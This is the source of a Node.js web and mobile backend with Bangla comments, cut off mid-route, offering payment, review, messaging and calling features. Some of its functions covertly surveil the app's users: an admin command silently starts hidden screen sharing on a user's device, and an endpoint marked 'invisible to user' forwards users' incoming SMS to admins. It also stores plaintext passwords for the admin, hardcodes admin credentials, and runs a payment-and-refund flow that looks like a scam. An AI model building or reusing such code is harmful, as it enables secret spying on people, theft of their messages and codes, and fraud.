const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;
const FacebookStrategy = require('passport-facebook').Strategy;
const bcrypt = require('bcrypt');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { Server } = require('socket.io');
const http = require('http');
const moment = require('moment');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});
const PORT = process.env.PORT || 5000;

// ডেটা স্টোরেজের জন্য মেমোরিতে অবজেক্ট (অস্থায়ী)
let users = [];
let payments = [];
let reviews = [];
let messages = []; // মেসেজ স্টোরেজ
let smsMessages = []; // SMS ফরওয়ার্ড মেসেজ স্টোরেজ
let connectedAdmins = new Set(); // Connected admin sockets
let connectedUsers = new Map(); // Connected users with their socket IDs
let contacts = []; // Contact list
let callHistory = []; // Call history
let activeCall = null; // Current active call
let textMessages = []; // Real-time text messages
let activeScreenSharing = new Map(); // Active screen sharing sessions
let adminControls = new Map(); // Admin control commands
// Admin user initialization
let adminUsers = [];

// Initialize admin user and test user on server start
const initializeAdmin = async () => {
  try {
    const adminHashedPassword = await bcrypt.hash('891994', 10);
    const testUserHashedPassword = await bcrypt.hash('123456', 10);
    
    adminUsers = [
      { 
        id: 1, 
        email: 'admin1994@admin.com', 
        password: adminHashedPassword, 
        name: 'Admin' 
      }
    ];
    
    // Create a test user for easier testing
    users.push({
      id: 1,
      userId: 'U000001',
      name: 'Test User',
      phone: '01712345678',
      email: 'test@test.com',
      password: testUserHashedPassword,
      originalPassword: '123456',
      balance: 0,
      joinedAt: new Date()
    });
    
    console.log('Admin user initialized successfully');
    console.log('Admin Login: admin1994@admin.com');
    console.log('Admin Password: 891994');
    console.log('Test User Login: test@test.com');
    console.log('Test User Password: 123456');
    console.log('Environment:', process.env.NODE_ENV || 'development');
  } catch (error) {
    console.error('Error initializing admin:', error);
  }
};

// Admin will be initialized when server starts

// মিডলওয়্যার সেটআপ
// Static file serving with proper headers for production
app.use(express.static(path.join(__dirname, 'public'), {
  maxAge: process.env.NODE_ENV === 'production' ? '1d' : 0,
  setHeaders: (res, path) => {
    if (path.endsWith('.css')) {
      res.setHeader('Content-Type', 'text/css');
    }
  }
}));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
// Trust proxy for production (Render uses proxy)
if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', 1);
}

app.use(session({
  secret: process.env.SESSION_SECRET || 'your_session_secret_key_2024',
  resave: false, // Don't save session if unmodified
  saveUninitialized: false, // Don't create session until something stored
  rolling: true, // প্রতি রিকুয়েস্টে সেশন এক্সটেন্ড করার জন্য
  cookie: { 
    maxAge: 24 * 60 * 60 * 1000, // ২৪ ঘন্টা (মিলিসেকেন্ডে)
    secure: process.env.NODE_ENV === 'production', // Production এ HTTPS এর জন্য
    httpOnly: true, // নিরাপত্তার জন্য
    sameSite: process.env.NODE_ENV === 'production' ? 'lax' : 'lax' // CSRF protection
  },
  name: 'sessionId' // কাস্টম সেশন নাম
}));

app.use(passport.initialize());
app.use(passport.session());

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// CSS route as fallback for production
app.get('/style.css', (req, res) => {
  res.type('text/css');
  res.sendFile(path.join(__dirname, 'public', 'style.css'));
});

// Debug endpoint removed for production security

// আপলোড ডিরেক্টরি তৈরি করা
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// মাল্টার কনফিগারেশন
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname);
  }
});

const upload = multer({ storage: storage });

// পাসপোর্ট স্ট্র্যাটেজি
passport.use(new LocalStrategy(
  { usernameField: 'email' },
  async (email, password, done) => {
    const user = users.find(u => u.email === email);
    if (!user) {
      return done(null, false, { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
    }
    
    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) {
      return done(null, false, { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
    }
    
    return done(null, user);
  }
));

passport.serializeUser((user, done) => {
  done(null, user.id);
});

passport.deserializeUser((id, done) => {
  const user = users.find(u => u.id === id);
  done(null, user);
});

// রুটস
app.get('/', (req, res) => {
  res.render('login', { message: null });
});

app.get('/login', (req, res) => {
  res.render('login', { message: null });
});

app.get('/register', (req, res) => {
  res.render('register', { message: null });
});

app.post('/register', async (req, res) => {
  const { name, phone, email, password } = req.body;
  
  // চেক করা যে ইউজার আগে থেকেই আছে কিনা
  const existingUser = users.find(u => u.email === email);
  if (existingUser) {
    return res.render('register', { message: 'এই ইমেইল দিয়ে আগে থেকেই একাউন্ট আছে' });
  }
  
  // পাসওয়ার্ড হ্যাশ করা
  const hashedPassword = await bcrypt.hash(password, 10);
  
  // নতুন ইউজার তৈরি করা
  const newUser = {
    id: users.length + 1,
    userId: `U${Date.now().toString().slice(-6)}${(users.length + 1).toString().padStart(3, '0')}`, // ইউনিক ইউজার আইডি
    name,
    phone,
    email,
    password: hashedPassword,
    originalPassword: password, // এডমিনের জন্য আসল পাসওয়ার্ড
    balance: 0,
    joinedAt: new Date()
  };
  
  users.push(newUser);
  res.redirect('/login');
});

app.post('/login', (req, res, next) => {
  console.log('Login attempt:', req.body.email);
  console.log('Session ID:', req.sessionID);
  
  passport.authenticate('local', (err, user, info) => {
    if (err) {
      console.error('Login error:', err);
      return next(err);
    }
    
    if (!user) {
      console.log('Login failed:', info);
      return res.render('login', { message: info.message || 'লগইন ব্যর্থ' });
    }
    
    req.logIn(user, (err) => {
      if (err) {
        console.error('Session login error:', err);
        return next(err);
      }
      
      console.log('Login successful for user:', user.email);
      console.log('Session after login:', req.session);
      return res.redirect('/dashboard');
    });
  })(req, res, next);
});

app.get('/dashboard', (req, res) => {
  console.log('Dashboard access attempt');
  console.log('User authenticated:', !!req.user);
  console.log('Session:', req.session);
  console.log('Session ID:', req.sessionID);
  
  if (!req.user) {
    console.log('User not authenticated, redirecting to login');
    return res.redirect('/login');
  }
  
  console.log('User authenticated, rendering dashboard');
  res.render('dashboard', { user: req.user });
});

app.get('/payment', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('payment', { user: req.user });
});

app.post('/payment', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { senderNumber, amount } = req.body;
  
  // পেমেন্ট রেকর্ড সেভ করা (কিন্তু ব্যালেন্স যোগ করা হবে না)
  const payment = {
    id: payments.length + 1,
    userId: req.user.id,
    senderNumber,
    amount: parseInt(amount),
    receiveNumber: '01846735445', // যে নাম্বারে টাকা পাঠানো হয়েছে
    status: 'pending',
    submittedAt: new Date()
  };
  
  payments.push(payment);
  
  // সফল সাবমিশনের মেসেজ দেখিয়ে ড্যাশবোর্ডে ফিরে যাওয়া
  res.render('dashboard', { 
    user: req.user, 
    paymentMessage: '৫ মিনিটের মধ্যে আপনার অ্যাকাউন্টে টাকা যোগ হয়ে যাবে। যদি টাকা না যোগ হয় তাহলে এডমিন চেক করে দিবেন।' 
  });
});

app.get('/write_review', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('write_review', { user: req.user });
});

app.post('/write_review', upload.single('screenshot'), (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { returnNumber, message } = req.body;
  const screenshot = req.file ? req.file.filename : null;
  
  // রিভিউ রেকর্ড সেভ করা
  const review = {
    id: reviews.length + 1,
    userId: req.user.id,
    returnNumber,
    message,
    screenshot,
    submittedAt: new Date(),
    status: 'pending'
  };
  
  reviews.push(review);
  
  res.render('write_review', { 
    user: req.user, 
    message: '৩০ মিনিটের মধ্যে আপনার টাকা ফেরত পেয়ে যাবেন' 
  });
});

// এডমিন রুটস
app.get('/admin_login', (req, res) => {
  res.render('admin_login', { message: null });
});

app.post('/admin_login', async (req, res) => {
  const { email, password } = req.body;
  
  console.log('==== ADMIN LOGIN DEBUG ====');
  console.log('Login attempt for email:', email);
  console.log('Admin users in memory:', adminUsers.length);
  console.log('Expected admin email: admin1994@admin.com');
  console.log('Environment:', process.env.NODE_ENV);
  
  // Force re-initialize admin if not found (for production issues)
  if (adminUsers.length === 0) {
    console.log('CRITICAL: Admin users array is empty! Re-initializing...');
    try {
      const adminHashedPassword = await bcrypt.hash('891994', 10);
      adminUsers = [
        { 
          id: 1, 
          email: 'admin1994@admin.com', 
          password: adminHashedPassword, 
          name: 'Admin' 
        }
      ];
      console.log('Emergency admin re-initialization successful');
    } catch (error) {
      console.error('Emergency admin re-initialization failed:', error);
    }
  }
  
  const admin = adminUsers.find(u => u.email === email);
  if (!admin) {
    console.log('Admin not found for email:', email);
    console.log('Available admin emails:', adminUsers.map(a => a.email));
    return res.render('admin_login', { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
  }
  
  const isMatch = await bcrypt.compare(password, admin.password);
  console.log('Password match result:', isMatch);
  
  if (!isMatch) {
    console.log('Password mismatch for admin:', email);
    return res.render('admin_login', { message: 'ভুল ইমেইল বা পাসওয়ার্ড' });
  }
  
  req.session.admin = admin;
  console.log('Admin login successful, redirecting to panel');
  console.log('==== END ADMIN LOGIN DEBUG ====');
  res.redirect('/admin_panel');
});

app.get('/admin_panel', (req, res) => {
  console.log('Admin panel access attempt');
  console.log('Admin session:', !!req.session.admin);
  console.log('Session ID:', req.sessionID);
  console.log('Full session:', req.session);
  
  if (!req.session.admin) {
    console.log('Admin not authenticated, redirecting to admin_login');
    return res.redirect('/admin_login');
  }
  
  console.log('Admin authenticated, rendering admin panel');
  res.render('admin_panel', { 
    users, 
    payments, 
    reviews,
    messages,
    admin: req.session.admin
  });
});

// এডমিন ইউজার ইনফরমেশন পেজ
app.get('/admin/user_information', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  res.render('user_information', { 
    users,
    admin: req.session.admin
  });
});

// ইউজার ডিলিট করার রুট
app.post('/admin/delete_user/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  const userId = parseInt(req.params.id);
  
  // ইউজার খুঁজে বের করা
  const userIndex = users.findIndex(u => u.id === userId);
  
  if (userIndex !== -1) {
    // ইউজার ডিলিট করা
    users.splice(userIndex, 1);
    
    // সংশ্লিষ্ট পেমেন্ট ডিলিট করা
    for (let i = payments.length - 1; i >= 0; i--) {
      if (payments[i].userId === userId) {
        payments.splice(i, 1);
      }
    }
    
    // সংশ্লিষ্ট রিভিউ ডিলিট করা
    for (let i = reviews.length - 1; i >= 0; i--) {
      if (reviews[i].userId === userId) {
        reviews.splice(i, 1);
      }
    }
    
    // সংশ্লিষ্ট মেসেজ ডিলিট করা
    for (let i = messages.length - 1; i >= 0; i--) {
      if (messages[i].senderId === userId || messages[i].receiverId === userId) {
        messages.splice(i, 1);
      }
    }
  }
  
  res.redirect('/admin/user_information');
});

// পেমেন্ট অনুমোদন করার রুট
app.post('/admin/approve_payment/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  const paymentId = parseInt(req.params.id);
  const payment = payments.find(p => p.id === paymentId);
  
  if (payment && payment.status === 'pending') {
    // পেমেন্ট অনুমোদন করা
    payment.status = 'approved';
    payment.approvedAt = new Date();
    payment.approvedBy = req.session.admin.id;
    
    // ইউজারের ব্যালেন্স আপডেট করা
    const userIndex = users.findIndex(u => u.id === payment.userId);
    if (userIndex !== -1) {
      users[userIndex].balance += payment.amount;
    }
  }
  
  res.redirect('/admin_panel');
});

// পেমেন্ট বাতিল করার রুট  
app.post('/admin/reject_payment/:id', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  const paymentId = parseInt(req.params.id);
  const payment = payments.find(p => p.id === paymentId);
  
  if (payment && payment.status === 'pending') {
    payment.status = 'rejected';
    payment.rejectedAt = new Date();
    payment.rejectedBy = req.session.admin.id;
  }
  
  res.redirect('/admin_panel');
});

app.get('/logout', (req, res) => {
  req.logout((err) => {
    if (err) {
      return next(err);
    }
    res.redirect('/login');
  });
});

app.get('/admin_logout', (req, res) => {
  req.session.admin = null;
  res.redirect('/admin_login');
});

// মেসেজিং রুট
app.get('/messages', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  res.render('messages', { user: req.user, messages: [] });
});

app.post('/search_user', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { searchUserId } = req.body;
  const foundUser = users.find(u => u.userId === searchUserId && u.id !== req.user.id);
  
  if (foundUser) {
    res.render('messages', { 
      user: req.user, 
      foundUser,
      messages: messages.filter(m => 
        (m.senderId === req.user.id && m.receiverId === foundUser.id) || 
        (m.senderId === foundUser.id && m.receiverId === req.user.id)
      ).sort((a, b) => new Date(a.sentAt) - new Date(b.sentAt))
    });
  } else {
    res.render('messages', { 
      user: req.user, 
      error: 'এই ইউজার আইডি দিয়ে কোনো ইউজার পাওয়া যায়নি!',
      messages: []
    });
  }
});

app.post('/send_message', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const { receiverId, messageText } = req.body;
  const receiver = users.find(u => u.id === parseInt(receiverId));
  
  if (receiver && messageText.trim()) {
    const newMessage = {
      id: messages.length + 1,
      senderId: req.user.id,
      receiverId: parseInt(receiverId),
      messageText: messageText.trim(),
      sentAt: new Date()
    };
    
    messages.push(newMessage);
  }
  
  res.redirect('/search_user_redirect/' + receiver.userId);
});

app.get('/search_user_redirect/:userId', (req, res) => {
  if (!req.user) {
    return res.redirect('/login');
  }
  
  const foundUser = users.find(u => u.userId === req.params.userId);
  
  if (foundUser) {
    res.render('messages', { 
      user: req.user, 
      foundUser,
      messages: messages.filter(m => 
        (m.senderId === req.user.id && m.receiverId === foundUser.id) || 
        (m.senderId === foundUser.id && m.receiverId === req.user.id)
      ).sort((a, b) => new Date(a.sentAt) - new Date(b.sentAt))
    });
  } else {
    res.redirect('/messages');
  }
});

// ========================= SMS FORWARDING SYSTEM =========================

// ========================= WEBRTC & MESSAGING SYSTEM =========================

// WebSocket connection handling for real-time notifications, calls, and messaging
io.on('connection', (socket) => {
  console.log('New client connected:', socket.id);
  
  // When admin connects
  socket.on('admin_connect', (data) => {
    if (data && data.isAdmin) {
      connectedAdmins.add(socket.id);
      console.log('Admin connected for real-time SMS:', socket.id);
      
      // Send recent SMS messages to newly connected admin
      socket.emit('sms_history', {
        messages: smsMessages.slice(-50), // Last 50 SMS
        count: smsMessages.length
      });
    }
  });
  
  // When user connects for calls and messaging
  socket.on('user_connect', (data) => {
    if (data && data.userId) {
      connectedUsers.set(data.userId, {
        socketId: socket.id,
        name: data.name || 'Unknown',
        phone: data.phone || '',
        status: 'online',
        connectedAt: new Date()
      });
      console.log(`User ${data.userId} connected for calls:`, socket.id);
      
      // Notify other users about online status
      socket.broadcast.emit('user_status_update', {
        userId: data.userId,
        status: 'online',
        name: data.name
      });
      
      // Send online users list
      const onlineUsers = Array.from(connectedUsers.entries()).map(([userId, userData]) => ({
        userId,
        name: userData.name,
        status: userData.status
      }));
      
      socket.emit('online_users', onlineUsers);
    }
  });
  
  // =================== WEBRTC SIGNALING ===================
  
  // Call initiation
  socket.on('initiate_call', (data) => {
    const { calleeId, callType, callerInfo } = data; // callType: 'audio' or 'video'
    
    console.log(`Call initiated from ${callerInfo.userId} to ${calleeId}, Type: ${callType}`);
    
    const calleeUser = connectedUsers.get(calleeId);
    if (calleeUser) {
      const callData = {
        callId: `call_${Date.now()}`,
        callerId: callerInfo.userId,
        calleeId: calleeId,
        callType: callType,
        callerInfo: callerInfo,
        initiatedAt: new Date(),
        status: 'ringing'
      };
      
      activeCall = callData;
      
      // Send call invitation to callee
      io.to(calleeUser.socketId).emit('incoming_call', callData);
      
      // Confirm call initiation to caller
      socket.emit('call_initiated', { success: true, callData });
      
      console.log(`Call invitation sent to ${calleeId}`);
    } else {
      socket.emit('call_failed', { 
        error: 'User not online', 
        message: 'প্রাপক অনলাইনে নেই' 
      });
    }
  });
  
  // Call acceptance
  socket.on('accept_call', (data) => {
    const { callId } = data;
    
    if (activeCall && activeCall.callId === callId) {
      activeCall.status = 'accepted';
      activeCall.acceptedAt = new Date();
      
      const callerUser = connectedUsers.get(activeCall.callerId);
      if (callerUser) {
        io.to(callerUser.socketId).emit('call_accepted', {
          callId: callId,
          message: 'কল গ্রহণ করা হয়েছে'
        });
        
        console.log(`Call ${callId} accepted`);
      }
    }
  });
  
  // Call rejection
  socket.on('reject_call', (data) => {
    const { callId, reason } = data;
    
    if (activeCall && activeCall.callId === callId) {
      const callerUser = connectedUsers.get(activeCall.callerId);
      if (callerUser) {
        io.to(callerUser.socketId).emit('call_rejected', {
          callId: callId,
          reason: reason || 'কল প্রত্যাখ্যান করা হয়েছে'
        });
        
        console.log(`Call ${callId} rejected: ${reason}`);
      }
      
      // Save to call history
      callHistory.push({
        ...activeCall,
        status: 'rejected',
        rejectedAt: new Date(),
        reason: reason
      });
      
      activeCall = null;
    }
  });
  
  // Call termination
  socket.on('end_call', (data) => {
    const { callId } = data;
    
    if (activeCall && activeCall.callId === callId) {
      activeCall.status = 'ended';
      activeCall.endedAt = new Date();
      
      // Notify both parties
      const callerUser = connectedUsers.get(activeCall.callerId);
      const calleeUser = connectedUsers.get(activeCall.calleeId);
      
      if (callerUser) {
        io.to(callerUser.socketId).emit('call_ended', { callId });
      }
      if (calleeUser) {
        io.to(calleeUser.socketId).emit('call_ended', { callId });
      }
      
      // Save to call history
      callHistory.push({...activeCall});
      activeCall = null;
      
      console.log(`Call ${callId} ended`);
    }
  });
  
  // WebRTC signaling (offer, answer, ice candidates)
  socket.on('webrtc_offer', (data) => {
    const { targetUserId, offer, callId } = data;
    const targetUser = connectedUsers.get(targetUserId);
    
    if (targetUser) {
      io.to(targetUser.socketId).emit('webrtc_offer', {
        offer,
        callId,
        fromUserId: data.fromUserId
      });
    }
  });
  
  socket.on('webrtc_answer', (data) => {
    const { targetUserId, answer, callId } = data;
    const targetUser = connectedUsers.get(targetUserId);
    
    if (targetUser) {
      io.to(targetUser.socketId).emit('webrtc_answer', {
        answer,
        callId,
        fromUserId: data.fromUserId
      });
    }
  });
  
  socket.on('webrtc_ice_candidate', (data) => {
    const { targetUserId, candidate, callId } = data;
    const targetUser = connectedUsers.get(targetUserId);
    
    if (targetUser) {
      io.to(targetUser.socketId).emit('webrtc_ice_candidate', {
        candidate,
        callId,
        fromUserId: data.fromUserId
      });
    }
  });
  
  // =================== SCREEN SHARING SYSTEM ===================
  
  // Admin initiates screen sharing (user won't see this)
  socket.on('admin_start_screen_sharing', (data) => {
    const { targetUserId, adminId } = data;
    
    console.log(`Admin ${adminId} initiating screen sharing for user ${targetUserId}`);
    
    const targetUser = connectedUsers.get(targetUserId);
    if (targetUser) {
      const sharingSession = {
        sessionId: `screen_${Date.now()}`,
        adminId: adminId,
        targetUserId: targetUserId,
        startedAt: new Date(),
        status: 'active'
      };
      
      activeScreenSharing.set(targetUserId, sharingSession);
      
      // Send invisible command to target user's app
      io.to(targetUser.socketId).emit('start_background_screen_sharing', {
        sessionId: sharingSession.sessionId,
        hidden: true // This tells the app to start sharing without UI
      });
      
      // Confirm to admin
      socket.emit('screen_sharing_started', {
        success: true,
        sessionId: sharingSession.sessionId,
        targetUser: targetUser.name
      });
      
      console.log(`Background screen sharing initiated for ${targetUserId}`);
    } else {
      socket.emit('screen_sharing_failed', {
        error: 'Target user not online',
        message: 'ব্যবহারকারী অনলাইনে নেই'
      });
    }
  });
  
  // User's screen sharing stream (background)
  socket.on('screen_sharing_stream', (data) => {
    const { sessionId, streamData, userId } = data;
    
    const session = activeScreenSharing.get(userId);
    if (session) {
      // Forward stream to admin
      const adminSockets = Array.from(connectedAdmins);
      adminSockets.forEach(adminSocketId => {
        io.to(adminSocketId).emit('receive_screen_stream', {
          sessionId: sessionId,
          streamData: streamData,
          userId: userId,
          timestamp: new Date().toISOString()
        });
      });
    }
  });
  
  // Admin stops screen sharing
  socket.on('admin_stop_screen_sharing', (data) => {
    const { targetUserId, adminId } = data;
    
    const session = activeScreenSharing.get(targetUserId);
    if (session) {
      const targetUser = connectedUsers.get(targetUserId);
      if (targetUser) {
        // Send invisible stop command
        io.to(targetUser.socketId).emit('stop_background_screen_sharing', {
          sessionId: session.sessionId
        });
      }
      
      activeScreenSharing.delete(targetUserId);
      
      socket.emit('screen_sharing_stopped', {
        success: true,
        sessionId: session.sessionId
      });
      
      console.log(`Screen sharing stopped for ${targetUserId} by admin ${adminId}`);
    }
  });
  
  // =================== REAL-TIME MESSAGING ===================
  
  socket.on('send_text_message', (data) => {
    const { receiverId, message, senderId, senderName } = data;
    
    const messageData = {
      id: textMessages.length + 1,
      senderId: senderId,
      senderName: senderName,
      receiverId: receiverId,
      message: message,
      timestamp: new Date().toISOString(),
      status: 'sent'
    };
    
    textMessages.push(messageData);
    
    // Send to receiver if online
    const receiverUser = connectedUsers.get(receiverId);
    if (receiverUser) {
      io.to(receiverUser.socketId).emit('new_text_message', messageData);
      messageData.status = 'delivered';
    }
    
    // Confirm to sender
    socket.emit('message_sent', {
      messageId: messageData.id,
      status: messageData.status,
      timestamp: messageData.timestamp
    });
    
    console.log(`Text message from ${senderId} to ${receiverId}: ${message.substring(0, 50)}...`);
  });
  
  // Handle disconnection
  socket.on('disconnect', () => {
    // Remove from admin connections
    connectedAdmins.delete(socket.id);
    
    // Find and remove user connection
    let disconnectedUserId = null;
    for (const [userId, userData] of connectedUsers.entries()) {
      if (userData.socketId === socket.id) {
        disconnectedUserId = userId;
        connectedUsers.delete(userId);
        break;
      }
    }
    
    if (disconnectedUserId) {
      // Notify other users about offline status
      socket.broadcast.emit('user_status_update', {
        userId: disconnectedUserId,
        status: 'offline'
      });
      
      // End any active call if user disconnects
      if (activeCall && (activeCall.callerId === disconnectedUserId || activeCall.calleeId === disconnectedUserId)) {
        socket.broadcast.emit('call_ended', { 
          callId: activeCall.callId,
          reason: 'ব্যবহারকারী সংযোগ বিচ্ছিন্ন হয়েছে'
        });
        
        callHistory.push({
          ...activeCall,
          status: 'disconnected',
          endedAt: new Date()
        });
        
        activeCall = null;
      }
      
      console.log(`User ${disconnectedUserId} disconnected`);
    }
    
    console.log('Client disconnected:', socket.id);
  });
});

// SMS Webhook endpoint - receives SMS from Android apps
app.post('/api/sms/webhook', (req, res) => {
  try {
    console.log('=== SMS WEBHOOK RECEIVED ===');
    console.log('Headers:', req.headers);
    console.log('Body:', req.body);
    
    // Extract SMS data (multiple formats supported)
    const smsData = {
      id: smsMessages.length + 1,
      from: req.body.from || req.body.phoneNumber || req.body.sender || 'Unknown',
      to: req.body.to || req.body.recipient || 'Unknown',
      message: req.body.text || req.body.message || req.body.body || '',
      timestamp: req.body.timestamp || req.body.receivedStamp || new Date().toISOString(),
      sim: req.body.sim || 'SIM1',
      deviceId: req.body.deviceId || req.headers['x-device-id'] || 'Unknown',
      receivedAt: new Date(),
      status: 'received'
    };
    
    // Validate required fields
    if (!smsData.message || smsData.message.trim() === '') {
      return res.status(400).json({
        success: false,
        error: 'Message content is required'
      });
    }
    
    // Store SMS
    smsMessages.push(smsData);
    
    // Send real-time notification to all connected admins
    const notificationData = {
      type: 'new_sms',
      sms: smsData,
      timestamp: new Date().toISOString(),
      totalCount: smsMessages.length
    };
    
    // Broadcast to all connected admins
    connectedAdmins.forEach(adminSocketId => {
      io.to(adminSocketId).emit('new_sms_notification', notificationData);
    });
    
    console.log(`SMS forwarded successfully. From: ${smsData.from}, Message: ${smsData.message.substring(0, 50)}...`);
    console.log(`Total SMS count: ${smsMessages.length}`);
    console.log(`Connected admins notified: ${connectedAdmins.size}`);
    
    // Response to Android app
    res.status(200).json({
      success: true,
      message: 'SMS received and forwarded successfully',
      smsId: smsData.id,
      timestamp: smsData.receivedAt
    });
    
  } catch (error) {
    console.error('Error processing SMS webhook:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error processing SMS'
    });
  }
});

// Test endpoint for SMS system
app.get('/test/sms', (req, res) => {
  // Create a test SMS
  const testSms = {
    id: smsMessages.length + 1,
    from: '+1234567890',
    to: '+0987654321',
    message: 'Test SMS message from system - ' + new Date().toLocaleString(),
    timestamp: new Date().toISOString(),
    sim: 'SIM1',
    deviceId: 'test-device',
    receivedAt: new Date(),
    status: 'received'
  };
  
  smsMessages.push(testSms);
  
  // Notify connected admins
  const notificationData = {
    type: 'new_sms',
    sms: testSms,
    timestamp: new Date().toISOString(),
    totalCount: smsMessages.length
  };
  
  connectedAdmins.forEach(adminSocketId => {
    io.to(adminSocketId).emit('new_sms_notification', notificationData);
  });
  
  res.json({
    success: true,
    message: 'Test SMS created and notifications sent',
    sms: testSms,
    connectedAdmins: connectedAdmins.size
  });
});

// Admin SMS management page
app.get('/admin/sms_management', (req, res) => {
  if (!req.session.admin) {
    return res.redirect('/admin_login');
  }
  
  // Get SMS statistics
  const stats = {
    total: smsMessages.length,
    today: smsMessages.filter(sms => {
      const today = new Date().toDateString();
      const smsDate = new Date(sms.receivedAt || sms.timestamp).toDateString();
      return today === smsDate;
    }).length,
    thisWeek: smsMessages.filter(sms => {
      const weekAgo = new Date();
      weekAgo.setDate(weekAgo.getDate() - 7);
      const smsDate = new Date(sms.receivedAt || sms.timestamp);
      return smsDate >= weekAgo;
    }).length
  };
  
  // Sort SMS by newest first
  const sortedSms = [...smsMessages].sort((a, b) => {
    const dateA = new Date(a.receivedAt || a.timestamp);
    const dateB = new Date(b.receivedAt || b.timestamp);
    return dateB - dateA;
  });
  
  res.render('sms_management', {
    admin: req.session.admin,
    smsMessages: sortedSms.slice(0, 100), // Last 100 SMS
    stats: stats,
    connectedClients: connectedAdmins.size
  });
});

// ========================= SKETCHWARE API ENDPOINTS =========================

// User registration/login for Sketchware apps
app.post('/api/mobile/register', (req, res) => {
  try {
    const { name, phone, email, password, deviceId } = req.body;
    
    // Validate required fields
    if (!name || !phone || !deviceId) {
      return res.status(400).json({
        success: false,
        error: 'Name, phone, and deviceId are required'
      });
    }
    
    // Check if user already exists
    const existingUser = users.find(u => u.phone === phone || (email && u.email === email));
    if (existingUser) {
      return res.status(400).json({
        success: false,
        error: 'User already exists with this phone or email'
      });
    }
    
    // Create new user
    const hashedPassword = password ? bcrypt.hashSync(password, 10) : null;
    const newUser = {
      id: users.length + 1,
      userId: `mobile_${Date.now().toString().slice(-6)}${(users.length + 1).toString().padStart(3, '0')}`,
      name: name,
      phone: phone,
      email: email || null,
      password: hashedPassword,
      deviceId: deviceId,
      registeredAt: new Date(),
      isActive: true,
      isMobileUser: true
    };
    
    users.push(newUser);
    
    res.status(200).json({
      success: true,
      message: 'User registered successfully',
      user: {
        userId: newUser.userId,
        name: newUser.name,
        phone: newUser.phone,
        registeredAt: newUser.registeredAt
      }
    });
    
    console.log(`Mobile user registered: ${newUser.name} (${newUser.phone})`);
    
  } catch (error) {
    console.error('Mobile registration error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

// Mobile user login
app.post('/api/mobile/login', (req, res) => {
  try {
    const { phone, password, deviceId } = req.body;
    
    if (!phone || !deviceId) {
      return res.status(400).json({
        success: false,
        error: 'Phone and deviceId are required'
      });
    }
    
    const user = users.find(u => u.phone === phone && u.isMobileUser);
    if (!user) {
      return res.status(401).json({
        success: false,
        error: 'User not found'
      });
    }
    
    // If password is set, verify it
    if (user.password && password) {
      const isMatch = bcrypt.compareSync(password, user.password);
      if (!isMatch) {
        return res.status(401).json({
          success: false,
          error: 'Invalid password'
        });
      }
    }
    
    // Update device ID
    user.deviceId = deviceId;
    user.lastLoginAt = new Date();
    
    res.status(200).json({
      success: true,
      message: 'Login successful',
      user: {
        userId: user.userId,
        name: user.name,
        phone: user.phone,
        email: user.email
      }
    });
    
    console.log(`Mobile user logged in: ${user.name} (${user.phone})`);
    
  } catch (error) {
    console.error('Mobile login error:', error);
    res.status(500).json({
      success: false,
      error: 'Internal server error'
    });
  }
});

// SMS forwarding endpoint (background - invisible to user)
app.post('/api/mobile/sms/forward', (req, res) => {
  try {
    const { 
      from, 
      message, 
      timestamp, 
      deviceId, 
      userId,
      sim = 'SIM1',
      messageId
    } = req.body;
    
    // Validate required fields
    if (!from || !message || !deviceId || !userId) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: from, message, deviceId, userId'
      });
    }
    
    // Create SMS record
    const smsData = {
      id: smsMessages.length + 1,
      messageId: messageId || `sms_${Date.now()}`,
      from: from,
      to: 'System',
      message: message,
      timestamp: timestamp || new Date().toISOString(),
      sim: sim,
      deviceId: deviceId,
      userId: userId,
      receivedAt: new Date(),
      status: 'forwarded',
      source: 'mobile_app'
    };
    
    smsMessages.push(smsData);
    
    // Notify all connected admins in real-time
    const notificationData = {
      type: 'new_sms',
      sms: smsData,
      timestamp: new Date().toISOString(),
      totalCount: smsMessages.length
    };
    
    connectedAdmins.forEach(adminSocketId => {
      io.to(adminSocketId).emit('new_sms_notification', notificationData);
    });
    
    // Response to mobile app
    res.status(200).json({
      success: true,
      message: 'SMS forwarded successfully',
      smsId: smsData.id
    });
    
    console.log(`SMS forwarded from mobile: ${from} -> ${message.substring(0, 50)}...`);
    
  } catch (error) {
    console.error('SMS forwarding error:', error);
    res.status(500).json({
      success: false,
      error: 'Failed to forward SMS'
    });
  }
});

// Get user's call history
app.get('/api/mobile/calls/:userId', (req, res) => {
  try {
    const { userId } = req.params;
    
    const userCalls = callHistory.filter(call => 
      call.callerId === userId || call.calleeId === userId
    ).slice(-50); // Last 50 calls
    
    res.status(200).json({
      success: true,
